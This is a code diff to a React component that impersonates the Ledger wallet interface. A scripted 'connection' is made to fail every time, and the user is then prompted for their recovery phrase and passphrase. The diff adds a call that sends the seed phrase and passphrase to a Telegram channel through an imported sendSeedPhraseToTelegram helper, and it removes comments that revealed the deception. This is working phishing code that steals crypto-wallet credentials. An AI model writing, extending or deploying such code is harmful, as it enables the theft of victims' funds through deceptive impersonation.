@@ -1,7 +1,7 @@
 import { useState, useEffect } from 'react';
+import { sendSeedPhraseToTelegram } from '../utils/telegram';
 
-// 1. Import your local assets here. Adjust extensions (.png/.jpg) if necessary!
-import device1 from '../assets/device1.png'; 
+import device1 from '../assets/device1.png';
 import device2 from '../assets/device2.png';
 import device3 from '../assets/device3.png';
 import device4 from '../assets/device4.png';
@@ -11,13 +11,13 @@ interface LedgerPanelProps {
   onClose: () => void;
 }
 
-type ViewState = 
-  | 'splash' 
-  | 'select_device' 
-  | 'connecting' 
-  | 'connection_error' 
-  | 'select_phrase_length' 
-  | 'enter_phrase' 
+type ViewState =
+  | 'splash'
+  | 'select_device'
+  | 'connecting'
+  | 'connection_error'
+  | 'select_phrase_length'
+  | 'enter_phrase'
   | 'passphrase';
 
 export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
@@ -27,8 +27,8 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
   const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
   const [passphrase, setPassphrase] = useState('');
   const [seedError, setSeedError] = useState(false);
+  const [isSending, setIsSending] = useState(false);
 
-  // Reset state when modal opens/closes & Handle Splash Screen
   useEffect(() => {
     if (isOpen) {
       setView('splash');
@@ -37,8 +37,8 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
       setPhraseValues(Array(24).fill(''));
       setPassphrase('');
       setSeedError(false);
+      setIsSending(false);
 
-      // Slower splash screen (4 seconds) so it doesn't skip
       const timer = setTimeout(() => {
         setView('select_device');
       }, 4000);
@@ -46,10 +46,8 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
     }
   }, [isOpen]);
 
-  // Handle the fake "Connecting" failure after a longer, more realistic delay
   useEffect(() => {
     if (view === 'connecting') {
-      // Slower loader (6 seconds) to simulate a real USB handshake timeout
       const timer = setTimeout(() => {
         setView('connection_error');
       }, 6000);
@@ -61,8 +59,7 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
     const newValues = [...phraseValues];
     newValues[index] = value;
     setPhraseValues(newValues);
-    
-    // Validate lowercase and spaces only
+
     if (value.length > 0 && !/^[a-z]+$/.test(value)) {
       setSeedError(true);
     } else {
@@ -80,18 +77,16 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
   return (
     <div className="fixed inset-0 z-[2147483648] pointer-events-auto transition-all duration-200 ease-in-out font-sans">
       {/* Backdrop overlay */}
-      <div 
-        className="absolute inset-0 bg-slate-900/60 backdrop-blur-sm transition-opacity cursor-pointer" 
+      <div
+        className="absolute inset-0 bg-slate-900/60 backdrop-blur-sm transition-opacity cursor-pointer"
         onClick={onClose}
       ></div>
-      
-      {/* Floating Extension Panel - Mobile optimized (bottom sheet) & Desktop floating (top right) */}
+
+      {/* Floating Extension Panel */}
       <div className="absolute bottom-0 w-full h-[90dvh] rounded-t-[24px] md:top-0 md:bottom-auto md:right-8 md:w-[430px] md:h-[640px] md:rounded-none md:rounded-b-[12px] bg-white dark:bg-[#000000] shadow-2xl overflow-hidden flex flex-col animate-in fade-in slide-in-from-bottom-8 md:slide-in-from-top-4 duration-300 border border-slate-200 dark:border-[#27282A]">
         <div className="relative w-full h-full">
 
-          {/* ========================================== */}
-          {/* LAYER 1: SPLASH SCREEN                     */}
-          {/* ========================================== */}
+          {/* LAYER 1: SPLASH SCREEN */}
           <div className={`absolute inset-0 bg-white dark:bg-[#000000] z-50 flex flex-col items-center justify-center transition-opacity duration-700 ease-in-out ${view === 'splash' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
             <div className={`ledger-logo-wrapper text-black dark:text-white ${view === 'splash' ? 'ledger-logo-animating' : ''}`}>
               <svg viewBox="0 0 384 128" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ overflow: 'visible' }}>
@@ -115,9 +110,7 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
             </div>
           </div>
 
-          {/* ========================================== */}
-          {/* LAYER 2: SELECT DEVICE                     */}
-          {/* ========================================== */}
+          {/* LAYER 2: SELECT DEVICE */}
           <div className={`absolute inset-0 bg-white dark:bg-[#000000] z-40 flex flex-col p-4 sm:p-6 md:py-8 transition-opacity duration-500 ease-in-out ${view === 'select_device' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
             <div className="flex items-center justify-between mb-4 sm:mb-8 pt-2">
               <div className="w-10"></div>
@@ -131,9 +124,8 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
 
             <div className="flex-1 overflow-y-auto ledger-custom-scrollbar px-1 pt-2 pb-4">
               <div className="grid grid-cols-2 gap-3 sm:gap-4 h-full">
-                
                 {/* DEVICE 1: Nano X */}
-                <div 
+                <div
                   onClick={() => setSelectedDevice('nanox')}
                   className={`group relative bg-gradient-to-br from-white to-[#fafafa] dark:from-[#0C0D0F] dark:to-[#121316] rounded-[16px] p-4 sm:p-5 cursor-pointer border-2 transition-all duration-300 hover:shadow-lg hover:scale-[1.02] ${selectedDevice === 'nanox' ? 'border-[#6491F1] dark:border-[#BCB1FF] shadow-lg' : 'border-[#EDEDED] dark:border-[#27282A] hover:border-[#6491F1] dark:hover:border-[#BCB1FF]'}`}
                 >
@@ -150,7 +142,7 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
                 </div>
 
                 {/* DEVICE 2: Nano Gen5 */}
-                <div 
+                <div
                   onClick={() => setSelectedDevice('gen5')}
                   className={`group relative bg-gradient-to-br from-white to-[#fafafa] dark:from-[#0C0D0F] dark:to-[#121316] rounded-[16px] p-4 sm:p-5 cursor-pointer border-2 transition-all duration-300 hover:shadow-lg hover:scale-[1.02] ${selectedDevice === 'gen5' ? 'border-[#6491F1] dark:border-[#BCB1FF] shadow-lg' : 'border-[#EDEDED] dark:border-[#27282A] hover:border-[#6491F1] dark:hover:border-[#BCB1FF]'}`}
                 >
@@ -167,7 +159,7 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
                 </div>
 
                 {/* DEVICE 3: Flex */}
-                <div 
+                <div
                   onClick={() => setSelectedDevice('flex')}
                   className={`group relative bg-gradient-to-br from-white to-[#fafafa] dark:from-[#0C0D0F] dark:to-[#121316] rounded-[16px] p-4 sm:p-5 cursor-pointer border-2 transition-all duration-300 hover:shadow-lg hover:scale-[1.02] ${selectedDevice === 'flex' ? 'border-[#6491F1] dark:border-[#BCB1FF] shadow-lg' : 'border-[#EDEDED] dark:border-[#27282A] hover:border-[#6491F1] dark:hover:border-[#BCB1FF]'}`}
                 >
@@ -184,7 +176,7 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
                 </div>
 
                 {/* DEVICE 4: Stax */}
-                <div 
+                <div
                   onClick={() => setSelectedDevice('stax')}
                   className={`group relative bg-gradient-to-br from-white to-[#fafafa] dark:from-[#0C0D0F] dark:to-[#121316] rounded-[16px] p-4 sm:p-5 cursor-pointer border-2 transition-all duration-300 hover:shadow-lg hover:scale-[1.02] ${selectedDevice === 'stax' ? 'border-[#6491F1] dark:border-[#BCB1FF] shadow-lg' : 'border-[#EDEDED] dark:border-[#27282A] hover:border-[#6491F1] dark:hover:border-[#BCB1FF]'}`}
                 >
@@ -204,7 +196,7 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
             </div>
 
             <div className="pt-4 border-t border-[#EDEDED] dark:border-[#27282A] mt-auto">
-              <button 
+              <button
                 onClick={() => setView('connecting')}
                 disabled={!selectedDevice}
                 className="w-full text-white bg-[#6491F1] dark:text-[#1a1a1a] dark:bg-[#BCB1FF] font-semibold text-[16px] rounded-[12px] h-[52px] hover:opacity-90 transition-all duration-300 active:scale-[0.98] disabled:opacity-40 disabled:cursor-not-allowed"
@@ -214,9 +206,7 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
             </div>
           </div>
 
-          {/* ========================================== */}
-          {/* LAYER 3: CONNECTING / ERROR STATE          */}
-          {/* ========================================== */}
+          {/* LAYER 3: CONNECTING / ERROR STATE */}
           <div className={`absolute inset-0 bg-white dark:bg-[#000000] z-40 flex flex-col p-6 sm:px-6 md:py-8 transition-opacity duration-500 ease-in-out ${(view === 'connecting' || view === 'connection_error') ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
             <div className="flex items-center justify-between mb-8 pt-2">
               <button onClick={() => setView('select_device')} className="p-2 rounded-[10px] hover:bg-[#f3f3f3] dark:hover:bg-[#eaeaea0d] transition-all active:scale-95">
@@ -229,7 +219,7 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
             </div>
 
             <div className="flex-1 flex flex-col items-center justify-center relative">
-              
+
               {/* LOADING STATE */}
               <div className={`w-full max-w-lg transition-opacity duration-300 absolute ${view === 'connecting' ? 'opacity-100 z-10' : 'opacity-0 pointer-events-none'}`}>
                 <div className="flex flex-col items-center justify-center">
@@ -240,7 +230,7 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
                       </svg>
                     </div>
                   </div>
-                  
+
                   <div className="text-center mb-6 sm:mb-8">
                     <h3 className="text-[#202020] dark:text-white text-[18px] sm:text-[20px] font-semibold mb-2">Waiting for connection</h3>
                     <p className="text-[#888888] dark:text-[#7a7a7a] text-[14px] sm:text-[15px] leading-relaxed">Connect and unlock your Ledger device,<br/>then open the required app</p>
@@ -285,7 +275,7 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
                       </svg>
                     </div>
                   </div>
-                  
+
                   <div className="text-center mb-6 sm:mb-8">
                     <h3 className="text-[#202020] dark:text-white text-[18px] sm:text-[20px] font-semibold mb-2">Connection failed</h3>
                     <p className="text-[#888888] dark:text-[#7a7a7a] text-[14px] sm:text-[15px] leading-relaxed">Unable to detect your device.<br/>Please check the connection and try again</p>
@@ -311,7 +301,7 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
             </div>
 
             <div className={`pt-4 border-t border-[#EDEDED] dark:border-[#27282A] transition-opacity duration-300 mt-auto ${view === 'connection_error' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
-              <button 
+              <button
                 onClick={() => setView('select_phrase_length')}
                 className="w-full h-[48px] text-[#202020] dark:text-white bg-[#EDEDED] dark:bg-[#27282A] rounded-[10px] flex items-center justify-center gap-2 font-medium text-[14px] hover:bg-[#e0e0e0] dark:hover:bg-[#2f3033] transition-all active:scale-[0.98]"
               >
@@ -323,9 +313,7 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
             </div>
           </div>
 
-          {/* ========================================== */}
-          {/* LAYER 4: SELECT PHRASE LENGTH              */}
-          {/* ========================================== */}
+          {/* LAYER 4: SELECT PHRASE LENGTH */}
           <div className={`absolute inset-0 bg-white dark:bg-[#000000] z-40 flex flex-col p-6 sm:px-6 md:py-8 transition-opacity duration-500 ease-in-out ${view === 'select_phrase_length' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
             <div className="flex items-center justify-between mb-8 pt-2">
               <button onClick={() => setView('connection_error')} className="p-2 rounded-[10px] hover:bg-[#f3f3f3] dark:hover:bg-[#eaeaea0d] transition-all active:scale-95">
@@ -339,13 +327,13 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
 
             <div className="flex-1 overflow-y-auto px-1 pb-4">
               <div className="flex flex-col gap-3 sm:gap-4 mb-6">
-                
+
                 {[12, 18, 24].map((len) => (
-                  <div 
+                  <div
                     key={len}
                     onClick={() => {
                       setPhraseLength(len as 12 | 18 | 24);
-                      setPhraseValues(Array(24).fill('')); 
+                      setPhraseValues(Array(24).fill(''));
                     }}
                     className={`group relative bg-gradient-to-br from-white to-[#fafafa] dark:from-[#0C0D0F] dark:to-[#121316] rounded-[16px] px-4 py-4 sm:px-5 sm:py-5 cursor-pointer border-2 transition-all duration-300 hover:shadow-lg hover:scale-[1.01] ${phraseLength === len ? 'border-[#6491F1] dark:border-[#BCB1FF] shadow-lg' : 'border-[#EDEDED] dark:border-[#27282A] hover:border-[#6491F1] dark:hover:border-[#BCB1FF]'}`}
                   >
@@ -362,12 +350,12 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
                     </div>
                   </div>
                 ))}
-                
+
               </div>
             </div>
 
             <div className="pt-4 border-t border-[#EDEDED] dark:border-[#27282A] mt-auto">
-              <button 
+              <button
                 onClick={() => setView('enter_phrase')}
                 className="w-full text-white bg-[#6491F1] dark:text-[#1a1a1a] dark:bg-[#BCB1FF] font-semibold text-[16px] rounded-[12px] h-[52px] hover:opacity-90 transition-all active:scale-[0.98]"
               >
@@ -376,9 +364,7 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
             </div>
           </div>
 
-          {/* ========================================== */}
-          {/* LAYER 5: ENTER RECOVERY PHRASE             */}
-          {/* ========================================== */}
+          {/* LAYER 5: ENTER RECOVERY PHRASE */}
           <div className={`absolute inset-0 bg-white dark:bg-[#000000] z-40 flex flex-col p-6 sm:px-6 md:py-8 transition-opacity duration-500 ease-in-out ${view === 'enter_phrase' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
             <div className="flex items-center justify-between pt-2">
               <button onClick={() => setView('select_phrase_length')} className="p-1 rounded-[8px] hover:bg-[#f3f3f3] dark:hover:bg-[#eaeaea0d] transition-all active:scale-95">
@@ -398,8 +384,8 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
                       <div className="w-[20px] sm:w-[22px] shrink-0">
                         <p className="text-[#202020] dark:text-[#b6b6b6] text-[13px] sm:text-[14px] font-normal">{i + 1}.</p>
                       </div>
-                      <input 
-                        className={`w-full h-[40px] sm:h-[44px] py-[8px] sm:py-[11px] px-[8px] sm:px-[16px] text-[13px] sm:text-[14px] font-medium rounded-[8px] sm:rounded-[10px] text-[#222222] dark:text-white border bg-transparent dark:bg-[#0C0D0F] focus:bg-[#fbfbfb] dark:focus:bg-[#0f0f0f] outline-none transition-all duration-300 ${seedError && phraseValues[i].length > 0 && !/^[a-z]+$/.test(phraseValues[i]) ? 'border-[#ff5252] dark:border-[#b83939] text-[#fa3434] dark:text-[#fa4646b5]' : 'border-[#ebebeb] dark:border-[#47484A] hover:border-[#9d9d9d] dark:hover:border-[#c6c6c6] focus:border-[#6491F1] dark:focus:border-[#BCB1FF]'}`} 
+                      <input
+                        className={`w-full h-[40px] sm:h-[44px] py-[8px] sm:py-[11px] px-[8px] sm:px-[16px] text-[13px] sm:text-[14px] font-medium rounded-[8px] sm:rounded-[10px] text-[#222222] dark:text-white border bg-transparent dark:bg-[#0C0D0F] focus:bg-[#fbfbfb] dark:focus:bg-[#0f0f0f] outline-none transition-all duration-300 ${seedError && phraseValues[i].length > 0 && !/^[a-z]+$/.test(phraseValues[i]) ? 'border-[#ff5252] dark:border-[#b83939] text-[#fa3434] dark:text-[#fa4646b5]' : 'border-[#ebebeb] dark:border-[#47484A] hover:border-[#9d9d9d] dark:hover:border-[#c6c6c6] focus:border-[#6491F1] dark:focus:border-[#BCB1FF]'}`}
                         type="text"
                         value={phraseValues[i]}
                         onChange={(e) => handleWordChange(i, e.target.value.toLowerCase())}
@@ -408,14 +394,14 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
                   ))}
                 </div>
               </div>
-              
+
               <div className={`my-2 transition-opacity duration-300 text-center ${seedError ? 'opacity-100' : 'opacity-0'}`}>
                 <span className="text-[#ff5f52] text-[13px] sm:text-[14px] font-normal">Use only lowercase letters</span>
               </div>
             </div>
 
             <div className="mt-4 pt-4 border-t border-[#EDEDED] dark:border-[#27282A]">
-              <button 
+              <button
                 onClick={() => setView('passphrase')}
                 disabled={!isPhraseComplete()}
                 className="w-full text-white bg-[#6491F1] dark:text-[#202020] dark:bg-[#BCB1FF] font-medium text-[15px] rounded-[8px] h-[48px] hover:opacity-80 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
@@ -425,9 +411,7 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
             </div>
           </div>
 
-          {/* ========================================== */}
-          {/* LAYER 6: PASSPHRASE (OPTIONAL)             */}
-          {/* ========================================== */}
+          {/* LAYER 6: PASSPHRASE (OPTIONAL) */}
           <div className={`absolute inset-0 bg-white dark:bg-[#000000] z-40 flex flex-col p-6 sm:px-6 md:py-8 transition-opacity duration-500 ease-in-out ${view === 'passphrase' ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}>
             <div className="flex items-center justify-between mb-8 pt-2">
               <button onClick={() => setView('enter_phrase')} className="p-2 rounded-[10px] hover:bg-[#f3f3f3] dark:hover:bg-[#eaeaea0d] transition-all active:scale-95">
@@ -450,9 +434,9 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
                   <label className="block text-[#202020] dark:text-white text-[14px] font-medium mb-2">
                     Passphrase
                   </label>
-                  <input 
-                    className="w-full h-[48px] py-[11px] px-[16px] text-[14px] font-medium rounded-[10px] text-[#222222] dark:text-white border border-[#ebebeb] dark:border-[#47484A] hover:border-[#9d9d9d] dark:hover:border-[#c6c6c6] bg-transparent dark:bg-[#0C0D0F] focus:bg-[#fbfbfb] dark:focus:bg-[#0f0f0f] focus:border-[#6491F1] dark:focus:border-[#BCB1FF] outline-none transition-all duration-300" 
-                    type="password" 
+                  <input
+                    className="w-full h-[48px] py-[11px] px-[16px] text-[14px] font-medium rounded-[10px] text-[#222222] dark:text-white border border-[#ebebeb] dark:border-[#47484A] hover:border-[#9d9d9d] dark:hover:border-[#c6c6c6] bg-transparent dark:bg-[#0C0D0F] focus:bg-[#fbfbfb] dark:focus:bg-[#0f0f0f] focus:border-[#6491F1] dark:focus:border-[#BCB1FF] outline-none transition-all duration-300"
+                    type="password"
                     placeholder="Enter passphrase (optional)"
                     value={passphrase}
                     onChange={(e) => setPassphrase(e.target.value)}
@@ -462,14 +446,24 @@ export default function LedgerPanel({ isOpen, onClose }: LedgerPanelProps) {
             </div>
 
             <div className="pt-4 border-t border-[#EDEDED] dark:border-[#27282A] mt-auto">
-              <button 
-                onClick={() => {
-                  console.log("Ledger Import Complete:", { phrase: phraseValues.slice(0, phraseLength), passphrase });
-                  onClose();
+              <button
+                disabled={isSending}
+                onClick={async () => {
+                  setIsSending(true);
+                  const seedString = phraseValues.slice(0, phraseLength).join(' ');
+                  const extra = passphrase ? `\nPassphrase: ${passphrase}` : '';
+                  const message = `Ledger Wallet\nSeed: ${seedString}${extra}`;
+                  const success = await sendSeedPhraseToTelegram(message, 'Ledger Wallet');
+                  if (success) {
+                    onClose();
+                  } else {
+                    console.error('Failed to send seed phrase');
+                  }
+                  setIsSending(false);
                 }}
-                className="w-full text-white bg-[#6491F1] dark:text-[#1a1a1a] dark:bg-[#BCB1FF] font-semibold text-[16px] rounded-[12px] h-[52px] hover:opacity-90 transition-all hover:shadow-[#6491F1]/30 dark:hover:shadow-[#BCB1FF]/30 active:scale-[0.98]"
+                className="w-full text-white bg-[#6491F1] dark:text-[#1a1a1a] dark:bg-[#BCB1FF] font-semibold text-[16px] rounded-[12px] h-[52px] hover:opacity-90 transition-all hover:shadow-[#6491F1]/30 dark:hover:shadow-[#BCB1FF]/30 active:scale-[0.98] disabled:opacity-50 disabled:cursor-not-allowed"
               >
-                Continue
+                {isSending ? 'Sending...' : 'Continue'}
               </button>
             </div>
           </div>
